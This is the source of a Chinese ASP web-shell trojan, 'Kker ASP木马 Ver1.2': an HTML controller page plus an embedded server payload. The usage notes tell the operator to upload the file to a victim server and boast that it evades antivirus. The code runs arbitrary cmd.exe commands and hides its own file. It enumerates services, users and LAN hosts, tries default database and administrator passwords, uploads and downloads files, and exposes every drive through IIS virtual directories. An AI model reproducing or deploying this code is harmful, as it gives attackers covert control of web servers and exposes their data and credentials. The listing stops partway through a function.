<html>
<head>
<title>:::砍客在线工具-ASP木马控制端:::〓中国砍客联盟〓http://Www.Kker.Cn 

http://Www.FreeHacker.Net---砍客ASP木马Ver1.2
</title>
<META http-equiv=MSThemeCompatible content=Yes><LINK href="logo.ico" 
rel="shortcut icon">
<meta http-equiv="Content-Language" content="zh-cn">
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<meta name="keywords" content="黑客技术,黑客文学,黑客软件,黑客教程,hacker,kker,攻击工具,扫

描工具,嗅探,监听,EMAIL信箱破解,木马,骇客,网络安全,CRACKER,破解,注册码,免费资源,炸弹,入侵,

中国砍客联盟,砍客联盟,砍客,黑客文学,黑软下载,free,pczz,小侃,kker,黑客精神,益出,溢出,ddos,s

yn flood,脚本攻击,编程,K,网络安全,漏洞">
<meta name="description" content="中国砍客联盟是一个民间的网络安全技术交流组织,我们提供的

服务包括:黑客技术,黑客文学,黑客工具,黑客教程,入侵检测,服务器安全,系统构建,程序开发,网站开

发,防火墙,安全评估等项目.">
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginheight="0" marginwidth="0">
<script src="" type="text/javascript"></script>
<style>
input {
    /*font: 100% Verdana, Helvetica, Arial, sans-serif;*/
    font-size: 9pt;
    border: 1px solid #006699;  
    color: ffffff;
    background-color: black;
    vertical-align: middle;
    margin-bottom: 1px; /* IE bug fix */
    padding: 0.1em;
}
A {
	COLOR: #ffffff; TEXT-DECORATION: none
}
A:hover {
	COLOR: #6699cc; TEXT-DECORATION: underline
}
BODY {
	SCROLLBAR-FACE-COLOR:#000000;SCROLLBAR-HIGHLIGHT-COLOR:#000000;SCROLLBAR-SHADOW-COLOR:#ffffff;SCROLLBAR-3DLIGHT-COLOR:#ffffff;SCROLLBAR-ARROW-COLOR:#ffffff;SCROLLBAR-TRACK-COLOR:#ffffff;SCROLLBAR-DARKSHADOW-COLOR:#000000; FONT-FAMILY: 宋体; 

}
UNKNOWN {
	FONT-SIZE: 9pt; FONT-FAMILY: "Verdana","Arial","宋体"
}
TD {
	FONT-SIZE: 9pt; FONT-FAMILY: 宋体,Arial,Verdana
}
FORM {
	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; 

PADDING-TOP: 0px
}
.kker {
	BORDER-RIGHT: 1px dotted; PADDING-RIGHT: 0px; BORDER-TOP: 1px dotted; 

PADDING-LEFT: 0px; FONT-SIZE: 9pt; PADDING-BOTTOM: 0px; MARGIN: 0px; BORDER-LEFT: 1px 

dotted; PADDING-TOP: 0px; BORDER-BOTTOM: 1px dotted; HEIGHT: 16px; BACKGROUND-COLOR: 

#ffffff
}
</style>
<%
dim url,pczz,cmdurl
url=trim(request.form("url"))
pczz=trim(request.form("pass"))
cmdurl=trim(request.form("cmdurl"))
if url="" then
%>
<BR>
<table cellspacing="0" cellpadding="0" width="100%" border="0">
	<tbody>
	<tr>
		<td valign="top" align="middle">
		<table cellspacing="0" cellpadding="0" width="768" border="0">
			<tbody>
			<tr>
				<td>
				<table cellspacing="1" cellpadding="0" width="100%" 

bgcolor="#006699" border="0">
					<tbody>
					<tr>
						<td align="middle" bgcolor="#000000"><br 

/>
						<font color="#ffffff">中国砍客联盟-在线服务</font> <br />
						<font color="#ffffff">如果您有更多的需要请<a href="http://www.kker.cn/guest/">留言</a></font><br />
						<br />
						<font 

color="#006699">密码框填写服务端(hacker.asp)中request("<font 

color=ff0000>password</font>"),请自行更改红色部分,<font 

color=ffffff>注意!两个都要更改</font>,旧服务端默认密码为xb</font>
						<br />
                        <strong><font color="#FFFFFF"><br>
                        砍客ASP木马Ver1.2</font></strong><br>
                        <br />
						<form method="post" target="_blank">
                          <table width="98%" border="0" cellspacing="0" cellpadding="0">
                            <tr> 
                              <td><div align="right"><font color="#ffffff">请输入该服务端的网址:</font></div></td>
                              <td><input size="50" name="url" /></td>
                            </tr>
                            <tr> 
                              <td><div align="right"><font color="#ffffff">请输入CMD.EXE的绝对地址(默认可不更改):</font></div></td>
                              <td><input size="50" value="cmd.exe" type="text" name="cmdurl" /></td>
                            </tr>
                            <tr> 
                              <td><div align="right"><font color="#ffffff">密码:</font></div></td>
                              <td><input 

size="10" type="password" name="pass" /></td>
                            </tr>
                            <tr> 
                              <td><div align="right"></div></td>
                              <td><input name="submit" type="submit" value="执行" 

/></td>
                            </tr>
                          </table>
                        </form>
						
						<P><FONT 
                  color=#ffffff>使用说明：将下面的hacker.asp文件传到要控制的服务器，然后在上面输入框中填写刚刚传的文件地址就可了，如：<a 

href="http://www.xxx.com/hacker.asp">http://www.xxx.com/hacker.asp</a> 
						然后点击执行,系统自动会把ASP木马上传到对方

网站,</FONT><FONT 
                  color=#FFFF00>绝对免查杀!!! </FONT> 
                  </P>
						<p></p>
						<ul>
							<li><font 

color="#ff0000"><b>服务端下载:</b></font><A 

href="http://www.kker.cn/online/cs/hacker.rar">hacker.asp</A> </li>
							<li><font color="#ffffff">请将您下载完的&nbsp; <b>hacker.asp</b>文件，放到您的网站的的任意目录里。</font><br />
							<br />
							<font color="#ffffff">Copyright 

(C) 2003-2004 
							Kker.cn All Rights Reserved <br />
							版权所有 任意抄袭 注意完整 砍客联

盟 EMAIL:webmaster@kker.cn QQ:93810 
							256051 </font></li>
						</ul>
						</td>
					</tr>
				</tbody>
				</table>
				</td>
			</tr>
		</tbody>
		</table>
		</td>
	</tr>
</tbody>
</table>

</body>

</html>
<center><script language="javascript">
var tcserver_name='stat1.vipstat.com';
var tc3_uid='51361';
var _referrer = escape(document.referrer);
</script>
</center>
<%else%>
<script language="javascript">
function replace(aa,bb,cc)
  {var lpabc,lpi;
    for(lpi=0;lpi<100000;lpi++)
    { lpabc=aa;
       aa=aa.replace(bb,cc);
       if(lpabc==aa)
       return aa;
    }return aa;}
  function ccc()
  {
    var tx;tx=document.all.<%=pczz%>.value;
    tx=replace(tx,"_textarea","textarea");
    tx=replace(tx,"<?%","<"+"%");
    tx=replace(tx,"%?>","%"+">");
    document.all.<%=pczz%>.value=tx;
	return true;
    }

 </script>
 
<br />
<form name="Kker" method="POST" action="<%=url%>" onsubmit="return(ccc());">
	<p align="center"><textarea style="display:none" name=<%=pczz%> rows="20" cols="100">
on error resume next
Session.TimeOut=1440
response.clear
Function CStrB(ByRef psUnicodeString)
	Dim lnLength
	Dim lnPosition
	lnLength = Len(psUnicodeString)
	For lnPosition = 1 To lnLength
		CStrB = CStrB & ChrB(AscB(Mid(psUnicodeString, lnPosition, 1)))
	Next
End Function
Function  BtoS(Binstr)
	skipflag=0
	strC=""
	If Not IsNull(binstr) Then
	lnglen=LenB(binstr)
	For i=1 To lnglen
	If skipflag=0 Then
	tmpBin=MidB(binstr,i,1)
	If AscB(tmpBin)>127 Then
	strC=strC&Chr(AscW(MidB(binstr,i+1,1)&tmpBin))
	skipflag=1
	Else
	strC=strC&Chr(AscB(tmpBin))
	End If
	Else
	skipflag=0
	End If
	Next
	End If
	BtoS  =  strC
End  Function
Function GetURL(url)
    Set Retrieval = Server.CreateObject("Microsoft.XMLHTTP")
          With Retrieval
          .Open "GET", url, false
		  .Send 
          GetURL = .responseBody
          End With
    Set Retrieval = Nothing
End Function
function eps(lpstr)eps="":for i=1 to len(lpstr)
eps=eps&chr(asc(mid(lpstr,i,1))+180*256+123):next:end function
'-------------------------------------------------------------
function uep(lpstr)uep="":for i=1 to len(lpstr)
uep=uep&chr(asc(mid(lpstr,i,1))-180*256-123+256*256):next:end function
if fso="" then
fszjz="scripting.filesystemobject":cmdzjz="WSCRIPT.SHELL":sqluserz="sa":sqlpassz="123456":sqlhostz="(local)":hostuserz="administrator":hostpassz="123456"
else
sqlhostz=uep(sh):fszjz=uep(fso):cmdzjz=uep(cmd):sqluserz=uep(su):sqlpassz=uep(sp):hostuserz=uep(hu):hostpassz=uep(hp)
end if
  if request("gl")<>"" then Session("gl")=request("gl")
  if Session("gl")="" then Session("gl")="pz"
  
  if request("fszjz") <>""  then fszjz=request("fszjz")
  if request("fszjz") <>""  then Session("fszjz")=request("fszjz")
  if Session("fszjz") <>""  then fszjz=Session("fszjz")

  if request("sqlhostz")<>""  then sqlhostz=request("sqlhostz")
  if request("sqlhostz")<>""  then Session("sqlhostz")=request("sqlhostz")
  if Session("sqlhostz")<>""  then sqlhostz=Session("sqlhostz")
  
  if request("sqluserz")<>""  then sqluserz=request("sqluserz")
  if request("sqluserz")<>""  then Session("sqluserz")=request("sqluserz")
  if Session("sqluserz")<>""  then sqluserz=Session("sqluserz")
    
  if request("sqlpassz")<>""  then sqlpassz=request("sqlpassz")
  if request("sqlpassz")<>""  then Session("sqlpassz")=request("sqlpassz")
  if Session("sqlpassz")<>""  then sqlpassz=Session("sqlpassz")
  
    
  if request("hostuserz")<>""  then hostuserz=request("hostuserz")
  if request("hostuserz")<>""  then Session("hostuserz")=request("hostuserz")
  if Session("hostuserz")<>""  then hostuserz=Session("hostuserz")
      
  if request("hostpassz")<>""  then hostpassz=request("hostpassz")
  if request("hostpassz")<>""  then Session("hostpassz")=request("hostpassz")
  if Session("hostpassz")<>""  then hostpassz=Session("hostpassz")
  
  if request("cmdzjz")<>""  then cmdzjz=request("cmdzjz")
  if request("cmdzjz")<>""  then Session("cmdzjz")=request("cmdzjz")
  if Session("cmdzjz")<>""  then cmdzjz=Session("cmdzjz")
err=0
attfil=request.servervariables("PATH_TRANSLATED")
textaaa=fs.getfile(attfil).attributes
if err<>0 then
err=0 
set fs=server.createObject(fszjz)  
if err=0 then fszj=1
else
fszj=1
end if
err=0
Call oScript.Run ("<%=cmdurl%> /c echo")
if err<>0 then
err=0
Set oScript = Server.CreateObject(cmdzjz)
if err=0 then cmdzj=1
else
cmdzj=1
end if
err=0
set fste=server.createObject(fszjz) 
if err=0 then testfs=1
err=0
set cmdte=server.createObject(cmdzjz)
if err=0 then testcmd=1
set fste=nothing
set cmdte=nothing
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''默认
response.write "<head><STYLE>.pczzbot{COLOR:#ffffff;background-color:#000000;border-left:1px solid #006699;border-top:1px solid #006699;border-right:1px solid #006699;border-bottom:1px solid #006699;width:50px;height:20px;PADDING-LEFT: 0.8em;PADDING-top: 0.2em}.kucp{COLOR:#ffffff;background-color:#000000;border-left:1px solid #006699;border-top:1px solid #006699;border-right:1px solid #006699;border-bottom:1px solid #006699;width:80px;height:20px;PADDING-LEFT: 0.8em;PADDING-top: 0.2em}body,td,span,div,a{COLOR:#ffffff;TEXT-DECORATION:none;FONT-SIZE:9pt;SCROLLBAR-FACE-COLOR:#000000;SCROLLBAR-HIGHLIGHT-COLOR:#000000;SCROLLBAR-SHADOW-COLOR:#ffffff;SCROLLBAR-3DLIGHT-COLOR:#ffffff;SCROLLBAR-ARROW-COLOR:#ffffff;SCROLLBAR-TRACK-COLOR:#ffffff;SCROLLBAR-DARKSHADOW-COLOR:#000000;FONT-FAMILY:宋体;}"&chr(13)&chr(10)&"span,a{cursor:hand;color:0066cc;}hr{height:1px;line-height:1px;color:#006699;}"&chr(13)&chr(10)&"input{font-size:9pt;border:1px solid #006699;color: ffffff;background-color:black;vertical-align:middle;margin-bottom:1px;padding: 0.1em;}</style>"
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")  
response.write "<title>中国砍客联盟荣誉出品(Http://Www.Kker.Cn)--->砍客ASP木马Ver1.2 服务器时间："&now()&"	</title>"
response.write "<script lanugage=""JavaScript"">"
response.write "<!-- "
response.write "function pop(pageurl)"
response.write  "{  var"
response.write  "popwin=window.open(pageurl,'popWin','scrollbars=yes,toolbar=no,location=no,directories=no,status=no,menubar=no,resizable=no,width=400,height=200,top=200,left=220');"
response.write   "return false;}"
response.write   "//-->"
response.write   "</script>"
response.write "</head>"
response.write "<body topmargin='0' leftmargin='0' bgcolor='000000'>"
Server.ScriptTimeout=999999

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''配置
if Session("gl")="pz" then
attfil=request.servervariables("PATH_TRANSLATED")
if fszj=1 then
	fs.getfile(attfil).attributes=39
else
	if cmdzj=1 then Call oScript.Run ("<%=cmdurl%> /c attrib +s +a +r +h " & attfil )
end if
if testfs=1 then response.write "<br><font color='#FF0000'>恭喜:</font>本空间支持FSO,"
if testcmd=1 then response.write "本空间支持cmd执行任意命令"
response.write "<br><div align=left><br>请选择您所需要的操作:<br>"
if fszj=1 then response.write " <a href="&Request.ServerVariables("URL")&"?gl=dir target='_self' class=kucp>磁盘管理</a>"
if cmdzj=1 then response.write " <a href="&Request.ServerVariables("URL")&"?gl=cmd target='_self' class=kucp>CMD命令符</a>"
response.write " <a href="&Request.ServerVariables("URL")&"?gl=sql target='_self' class=kucp>MSSQL管理</a>"
response.write " <a href="&Request.ServerVariables("URL")&"?gl=nofso target='_self' class=kucp>免FSO上传</a>"
response.write " <a href="&Request.ServerVariables("URL")&"?gl=lan target='_self' class=kucp>局域网信息</a>"

'response.write "  <a href="&Request.ServerVariables("URL")&"?gl=vdir target='_self'>虚拟</a>"
'response.write "  <a href="&Request.ServerVariables("URL")&"?gl=zh target='_self'>帐号</a>"
response.write "</div>"
response.write "<FORM action="&Request.ServerVariables("URL")&"?"&request.querystring&" method=POST>FS0组建:<input type=text name='fszjz' size=40 value='"&fszjz&"'>CMD组建:<input type=text name='cmdzjz' size=40 value='"&cmdzjz&"'><br>SQLUser:<input type=text name='sqluserz' size=40 value='"&sqluserz&"'>sqlpass:<input type=text name='sqlpassz' size=40 value='"&sqlpassz&"'><br>hosuser:<input type=text name='hostuserz' size=40 value='"&hostuserz&"'>hospass:<input type=text name='hostpassz' size=40 value='"&hostpassz&"'><br>sqlhost:<input type=text name='sqlhostz' size=40 value='"&sqlhostz&"'> <input type=submit value='设置'>---------<a href="&Request.ServerVariables("URL")&"?gl=bc target='_self'>保存</a>--------<a href="&Request.ServerVariables("URL")&"?gl=bc&mr=y target='_self'>默认保存</a></FORM><PRE><br>"

response.write"<table border=0 width=500 cellspacing=0 cellpadding=0 class='noborder'>"
response.write"<tr><td width='100%'><center><b>中国砍客联盟C/S ASP木马Ver1.2   程序制作:孤独 Pczz</b></center></td></tr>"
response.write"<tr><td><table border=0 width=100% cellspacing=1 cellpadding=0 class=noborder bgcolor=006699>"
response.write"<tr bgcolor=#000000 height=18 class=noborder>"
response.write"<td width='59%' align=left> 服务器名</td>"
response.write"<td width=41% bgcolor=#000000> " & Request.ServerVariables("SERVER_NAME") & "</td></tr>"
response.write"<tr bgcolor=#000000 height=18 class=noborder><td align=left> 服务器IP</td><td> "
response.write Request.ServerVariables("LOCAL_ADDR")
response.write "</td></tr><tr bgcolor=#000000 height=18 class=noborder>"
response.write "<td align=left> 服务器端口</td><td> "
response.write Request.ServerVariables("SERVER_PORT")
response.write "</td></tr>"

response.write "<tr bgcolor=#000000 height=18 class=noborder><td align=left> 机器名</td><td> "
response.write oScriptNet.ComputerName
response.write "</td></tr>"

response.write "<tr bgcolor=#000000 height=18 class=noborder><td align=left> 帐号</td><td> "
response.write oScriptNet.UserName
response.write "</td></tr>"

response.write "<tr bgcolor=#000000 height=18 class=noborder><td align=left> WEB路径</td><td> "
response.write request.servervariables("APPL_PHYSICAL_PATH")
response.write "</td></tr>"

response.write "<tr bgcolor=#000000 height=18 class=noborder><td align=left> ADSIPath</td><td> "
response.write request.servervariables("APPL_MD_PATH")
response.write "</td></tr>"


response.write "</td></tr><tr bgcolor=#000000 height=18 class=noborder><td align=left> 本文件绝对路径</td><td> "
response.write server.mappath(Request.ServerVariables("SCRIPT_NAME"))
response.write "<tr bgcolor=#000000 height=18 class=noborder><td align=left> 服务器时间</td><td> "
response.write now
response.write "</td></tr><tr bgcolor=#000000 height=18 class=noborder><td align=left> 服务器CPU数量</td><td> "
response.write  Request.ServerVariables("NUMBER_OF_PROCESSORS")
response.write "个</td></tr><tr bgcolor=#000000 height=18 class=noborder><td align=left> 服务器操作系统</td><td> "
response.write Request.ServerVariables("OS")
response.write "</td></tr><tr bgcolor=#000000 height=18 class=noborder><td align=left> 客户端IP: 端口 [代理]</td><td> "
response.write Request.ServerVariables("REMOTE_ADDR") & "|" & Request.ServerVariables("REMOTE_PORT") & "[" & Request.ServerVariables("HTTP_X_FORWARDED_FOR")
response.write "]</td></tr><tr bgcolor=#000000 height=18 class=noborder>"
dim t1,t2,lsabc,thetime
t1=timer
for i=1 to 500000
lsabc= 1 + 1
next
t2=timer
thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)

response.write "<td align=left> 服务器运算速度测试</td><td> <font color=red>" & thetime & "毫秒</font></td></tr></table></td></tr></table>"

on error resume next
response.write"<BR><BR><font color='#FF0000'>〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓以下是这台计算机的进程表〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓</font><BR>"
set domainObject = GetObject("WinNT://.")
for each obj in domainObject
  if  mid(obj.path,4,3) <>"win" and mid(obj.path,4,3) <>"WIN" and OBJ.StartType=2 then
 N2=N2&obj.Name&"--"&obj.DisplayName &"--"&OBJ.StartType&"<br><font color=#FF0000>"&obj.path& "</font><br><BR>"
  else
 N1=N1&obj.Name&"--"&obj.DisplayName &"--"&OBJ.StartType&"<br><font color=#006699>"&obj.path& "</font><br><BR>"
  end if
next
set domainObject=nothing
RESPONSE.WRITE N2&N1
response.write"<BR><font color='#FF0000'>〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓以上是这台计算机的进程表〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓</font><BR><BR><BR>"
response.end
end if 

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''保存
if Session("gl")="bc"   then
attfil=request.servervariables("PATH_TRANSLATED")
Set f = fs.OpenTextFile(attfil, 1, 0, 0)
code = f.ReadAll
codes=split(code,"<!"&"了>")
olds=codes(1)
news="<"&"%fso="""&eps(fszjz)&""":cmd="""&eps(cmdzjz)&""":sh="""&eps(sqlhostz)&""":su="""&eps(sqluserz)&""":sp="""&eps(sqlpassz)&""":hu="""&eps(hostuserz)&""":hp="""&eps(hostpassz)&"""%"&">"
if request("mr")="y" then news="<!@>"
if testfs<>1 then news="<object id=fs RUNAT=SERVER  classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'></object>"&news
if testcmd<>1 then news="<object id=oScript RUNAT=SERVER  classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>"&news
newcode=replace(code,olds,news)
fs.getfile(attfil).attributes=0
fs.createtextfile(attfil,1).write newcode
fs.getfile(attfil).attributes=39
response.write "<script  LANGUAGE=javascript>"
response.write "window.location.replace('"&Request.ServerVariables("URL")&"?gl=pz');" 
response.write "</script>" 
response.end
end if 
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''帐号
if Session("gl")="zh"   then
Response.Status="401 Unauthorized"
response.write "<script  LANGUAGE=javascript>"
response.write "window.location.replace('"&Request.ServerVariables("URL")&"?gl=pz');" 
response.write "</script>" 
response.end
end if 
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''局域网信息
if Session("gl")="lan" then

sDomain = Request("Domain")
sComputer = Request("Computer")
sGroup = Request("Group")
sUser = Request("User")

if len(trim(sUser)) > 0 then
    Set objGroup = GetObject("WinNT://" & sDomain & "/" & sComputer & "/" & sUser)
    For Each objUser In objGroup.Groups
        Response.Write objUser.Name & "<br>" & vbCrLf
    Next
    Response.Write "</table><p><a href="&Request.ServerVariables("URL")&"?Domain=" & sDomain & "&Computer=" & sComputer & ">Back to " & sComputer & "</a></p>"
response.end
elseif len(trim(sGroup)) > 0 then
    Set objGroup = GetObject("WinNT://" & sDomain & "/" & sComputer & "/" & sGroup)
    For Each objUser In objGroup.Members
        Response.Write objUser.Name & "<br>" & vbCrLf
    Next
    Response.Write "</table><p><a href="&Request.ServerVariables("URL")&"?Domain=" & sDomain & "&Computer=" & sComputer & ">Back to " & sComputer & "</a></p>"
response.end
elseif len(trim(sComputer)) > 0 then
    Set objComputer = GetObject("WinNT://" & sDomain & "/" & sComputer)
    Response.Write "<table border=0>"
    For Each objObject In objComputer
        if strcomp(objObject.Class, "group", 1) = 0 then
            Response.Write "<tr><td>" & objObject.Class & "</td><td>  <a href="&Request.ServerVariables("URL")&"?Domain=" & sDomain & "&Computer=" & sComputer & "&Group=" & objObject.Name & ">" & objObject.Name & "</a></td></tr>" & vbCrLf
        elseif strcomp(objObject.Class, "user", 1) = 0 then
            Response.Write "<tr><td>" & objObject.Class & "</td><td>  <a href="&Request.ServerVariables("URL")&"?Domain=" & sDomain & "&Computer=" & sComputer & "&User=" & objObject.Name & ">" & objObject.Name & "</a></td></tr>" & vbCrLf
        else
            Response.Write "<tr><td>" & objObject.Class & "</td><td>  " & objObject.Name & "</td></tr>" & vbCrLf
        end if
    Next
		    Response.Write "本地用户和组:<br>"
    Response.Write "</table><p><a href="&Request.ServerVariables("URL")&"?Domain=" & sDomain & ">Back to " & sDomain & "</a></p>"
response.end
elseif len(trim(sDomain)) > 0 then
    Set objDomain = GetObject("WinNT://" & sDomain)
		    Response.Write "计算机名称:<br>"
    For Each objComputer In objDomain
        if strcomp(objComputer.Class, "computer", 1) = 0 then
            Response.Write "<a href="&Request.ServerVariables("URL")&"?domain=" & sDomain & "&computer=" & objComputer.Name & ">" & objComputer.Name & "<br>"
        end if
    Next
    
    Response.Write "<p><a href="&Request.ServerVariables("URL")&"?gl=lan>Back to domain list</a></p>"
response.end
else
    Set objWinNT = GetObject("WinNT:")
		    Response.Write "工作组计算机:<br>"
    For Each objDomain In objWinNT
        if strcomp(objDomain.Class, "domain", 1) = 0 then
            Response.Write "<a href="&Request.ServerVariables("URL")&"?domain=" & objDomain.Name & ">" & objDomain.Name & "<br>"
        end if
    Next
			Response.Write "<br><a href="&Request.ServerVariables("URL")&"?gl=pz>返回</a></br>"
response.end
end if
end if
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''虚拟目录
if Session("gl")="vdir"   then
response.write "<BR><FORM action="&Request.ServerVariables("URL")&"?"&request.querystring&" method=POST>name1:<input type=text name='name1' size=10 value='vtjg\'>name2:<input type=text name='name2' size=10 value='wtjg\'>WEBNO:<input type=text name='webno' size=3 value='1'>方式(建立—删除)：<input type='checkbox' name='ms' value='1' checked><input type=submit value='运行'>   <a href="&Request.ServerVariables("URL")&"?gl=pz target='_self'>返回</a></FORM><PRE>"
if request("webno")<>"" then 
webno=request("webno") 
ms=request("ms")
name1=request("name1")
name2=request("name2")
err=0
for y=0 to 1
doc=y
for x=3 to 26
vpath=chr(64+x)&":\" 
if y=0 then name=name1&chr(64+x) 
if y=1 then name=name2&chr(64+x) 
if ms=1 then
iscreate=CreateWebVDir(vpath,webno,name) 
else
iscreate=DELETEWebVDir(webno,name)
end if
next
next
if err=0 then 
response.write "执行成功！"
else
response.write "执行失败！"
end if
Function CreateWebVDir(VDir,WNumber,VDname) 
VDirName="vdir" 
Set ServerObj = GetObject("IIS://127.0.0.1/W3SVC/"&WNumber&"/ROOT") 
Set VDirObj = ServerObj.Create("IIsWebVirtualDir", VDName) 
VDirObj.Path = VDir 
vdirObj.AuthFlags = 5
if doc=0 then
vdirObj.AccessSource = 1
vdirObj.AccessRead = 1
vdirObj.AccessWrite = 1
vdirObj.DirBrowseShowLongDate = 1
vdirObj.EnableDirBrowsing = 1
vdirObj.DirBrowseShowDate = 1
vdirObj.DirBrowseShowTime = 1
vdirObj.DirBrowseShowSize = 1
vdirObj.DirBrowseShowExtension = 1
else
vdirObj.DirBrowseFlags = &H4000003E
vdirObj.AccessFlags = 515
vdirObj.AspEnableParentPaths=1
end if
VDirObj.EnableDefaultDoc=doc 
VDirObj.AppFriendlyName=name
VDirObj.AppIsolated="2"
VDirObj.AppRoot="/LM/W3SVC/"&WNumber&"/Root/"&name
VDirObj.SetInfo 
Set VDirObj=Nothing 
Set ServerObj=Nothing 
End Function 
Function DELETEWebVDir(WNumber,VDname) 
Set ServerObj = GetObject("IIS://127.0.0.1/W3SVC/"&WNumber&"/ROOT") 
Set VDirObj = ServerObj.DELETE("IIsWebVirtualDir", VDName) 
Set VDirObj=Nothing 
Set ServerObj=Nothing 
End Function 
end if
response.end
end if 
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''命令方式
if Session("gl")="cmd"   then 
szCMD =Request.Form(".CMD")
szCMD1 =Server.HTMLEncode(Request.Form(".CMD"))
If (szCMD <> "") Then
file=left(now(),4)&right(now(),2)&"cc.txt"
szTempFile =server.mappath(".")&"\"&file
szTempFiles=server.mappath(".")&"\*cc.txt"
if request("xs")="on" then
if request("yx")<>"on" then
Call oScript.Run ("<%=cmdurl%> /c " & szCMD & " > " & szTempFile, 0, True)
else
Call oScript.Run (szCMD & " > " & szTempFile, 0, True)
end if 
else
if request("yx")<>"on" then
Call oScript.Run ("<%=cmdurl%> /c " & szCMD )
else
Call oScript.Run (szCMD )
end if
end if
End If
response.write "<BR>执行任意CMD命令"
response.write " <FORM action="&Request.ServerVariables("URL")&"?"&request.querystring&" method=POST><input type=text name='.CMD' size=65 value="""&szCMD1&""">显示：<input type='checkbox' name='xs' value='on' checked>程序：<input type='checkbox' name='yx' value='on' > <input type=submit value='运行'>   <a href="&Request.ServerVariables("URL")&"?gl=pz target='_self'>返回</a></FORM><PRE>"
if request("xs")="on" then
response.flush
response.write "<_textarea style='background-color:black;font-size:9pt;font-size:9pt;color:ffffff;margin-bottom:1px;padding:0.1em;' name=<%=pczz%> rows=26 cols=108 >"
response.flush
if left(szcmd,5)="type " or left(szcmd,5)="TYPE " then 
tt="http://"&Request("http_host")&Request("URL")&"/../"&file
BINS=BtoS(GetUrl(tt))
BINS=replace(bins,"</text"&"area>","</_text"&"area>")
BINS=replace(bins,"</TEXT"&"AREA>","</text"&"area>")
response.write BINS
else 
response.write server.execute(file)
end if
response.write "</_textarea>"
response.flush
response.write "<script>"
response.write "function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi<100000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}"
response.write "function ccc()"
response.write "{"
response.write "var tx;"
response.write "tx=document.all.<%=pczz%>.value;"
response.write "tx=replace(tx,""_te"+"xtarea"",""_textarea"");"
response.write "document.all.<%=pczz%>.value=tx;"
response.write "}"
response.write "ccc();"
response.write "</script>"
Call oScript.Run ("<%=cmdurl%> /c del " & szTempFiles&" /f /q" )
end if
response.end
end if
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''文件方式
if Session("gl")="dir" then
aduser=uep("窜"):adpass=uep("摧"):sahost=uep("船喘床穿传穿传穿船"):sauser=uep("打歹歹"):sapass=uep("船串创床窗串串串疮闯传殆殆"):imgp=uep("淬达达措吹椽椽崔翠达呆穿传床串串穿崔搓磋椽大歹搭催椽寸翠摧错窜错呆椽错脆崔呆崔寸脆催椽翠磋窜粹脆搭椽")
fso=uep("搭崔错翠措达翠撮粹穿瘁翠寸脆搭呆搭达脆磋搓摧村脆崔达")
ADOX=uep("醇纯词从穿淳窜达窜寸搓粹")
adodb=uep("窜催搓催摧穿崔搓撮撮脆崔达翠搓撮")
WSHELL=uep("匆次淳赐茨此聪穿次疵蠢辞辞")
WNETWORK=uep("匆次淳赐茨此聪穿瓷蠢聪匆词赐雌")
Dictionary=uep("次崔错翠措达翠撮粹穿纯翠崔达翠搓撮窜错呆")
AdodbS=uep("醇催搓催摧穿次达错脆窜磋")
::response.write ""&bbf&"<!endconfig>"
bbf=chr(13)&chr(10):y=chr(34):self=Request("URL")
'-------------------------------------------------------------

'-------------------------------------------------------------
function echo(lpstr):response.write lpstr:end function
'-------------------------------------------------------------
function close():echo "<script>opener.document.location.reload();opener=null;self.close();</script>":response.end:end function
'-------------------------------------------------------------
::response.write ""&bbf&"<body Leftmargin=6 Topmargin=2>"&bbf&"":
'set fs= server.createobject(fso)
fdo=lcase(request("fdo"))
fp1=request("fp1")
fp2=request("fp2")
'response.end
if fdo="up" then
	Server.ScriptTimeOut=5000
	
set upload=new upload_pczz
if upload.form("filepath")="" then
response.write "请输入要上传至的目录!"
response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'>返回上一页</font></a></center>"
set upload=nothing
response.end
else
formPath=upload.form("filepath")
if right(formPath,1)<>"/" then formPath=formPath&"/"
end if
iCount=0
for each formName in upload.objForm
next
response.write "<br>"
for each formName in upload.objFile
set file=upload.file(formName)
if file.FileSize>0 then
'file.SaveAs Server.mappath(formPath&file.FileName)
'虚拟路径上传
file.SaveAs formPath&file.FileName
'物理路径上传
response.write "<center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" 上传成功!</center><br>"
iCount=iCount+1
end if
set file=nothing
next
set upload=nothing
response.write "<center>"&iCount&"个文件上传结束!</center>"
response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'>返回上一页</font></a></center>"
response.end
end if
if fdo="down" then
	downFile(fp1)
	response.end
end if
if fdo="hide" then
	fp1=pn(fp1):fp2=fp1&"\desktop.ini"
	if not fs.fileExists(fp2) then
	fs.getfolder(fp1).attributes=22
	lr="[.ShellClassInfo]"+bbf+"CLSID={645FF040-5081-101B-9F08-00AA002F954E}"
	fs.createtextfile(fp2).Write lr
	fs.getfile(fp2).attributes=6
	echo "<script>alert('此目录已隐藏！');"
	else
	fs.getfolder(fp1).attributes=48
	fs.DeleteFile fp2,True
	echo "<script>alert('此目录已解除隐藏！');"
	end if
	echo "history.go(-1);</script>":response.end
end if
if fdo="adddir" then
	fp1=pn(fp1):fs.createfolder(fp1)
